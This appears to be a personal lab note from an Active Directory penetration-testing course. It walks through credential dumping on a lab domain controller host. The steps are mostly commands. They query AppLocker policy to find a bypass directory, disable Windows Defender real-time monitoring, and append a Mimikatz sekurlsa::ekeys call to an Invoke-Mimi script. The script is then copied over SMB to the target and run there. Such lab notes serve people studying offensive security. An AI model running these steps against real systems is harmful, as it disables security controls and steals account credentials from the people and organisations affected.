 
to dump hashes.
connect to target machine check if app locker is present:
```
reg query HKLM\Software\Policies\Microsoft\Windows\SRPV2
```
if yes, then check which directory bypasses this 
```
reg query HKLM\Software\Policies\Microsoft\Windows\SRPV2\Script\06dce67b-934c-454f-a263-2515c8796a5d
```
disable real time monitoring
before than, open powershell and enter
```
Enter-PSSession dcorp-<>
```
```
Set-MpPreference -DisableRealtimeMonitoring $true -Verbose
```
ON USER MACHINE:
- Create a copy of Invoke-Mimi.ps1 and rename it to Invoke-MimiEx.ps1.
- Open Invoke-MimiEx.ps1 in PowerShell ISE (Right click on it and click Edit).
- Add 
```
  Invoke-Mimi -Command '"sekurlsa::ekeys"' 
```
    to the end of the file
again on user machine:
```
Copy-Item C:\AD\Tools\Invoke-MimiEx.ps1 \\dcorp-adminsrv.dollarcorp.moneycorp.local\c$\'Program Files'
```
run script on target machine
```
.\Invoke-MimiEx.ps1
```

next go ahead with [[safteykatz]] to extract creds. or you can move to [[Persistence]] from here.